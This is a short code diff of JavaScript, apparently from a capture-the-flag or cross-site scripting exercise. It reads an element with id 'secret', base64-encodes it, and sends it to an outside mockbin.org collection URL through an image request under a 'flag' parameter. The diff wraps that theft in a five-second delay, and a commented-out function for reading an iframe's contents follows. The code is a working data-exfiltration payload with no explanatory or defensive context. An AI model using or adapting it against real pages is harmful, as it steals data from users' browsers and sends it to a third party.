@@ -30,9 +30,10 @@ function sendrequ(payload){
 	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + payload;
 	document.body.appendChild(img);
 }   
-
+setTimeout(function(){
 console.log(getBase64Image(document.getElementById("secret")));
 sendrequ(getBase64Image(document.getElementById("secret")));
+},5000);
 /*
 function getFrameContents(){
    var iFrame =  document.getElementById('testf');
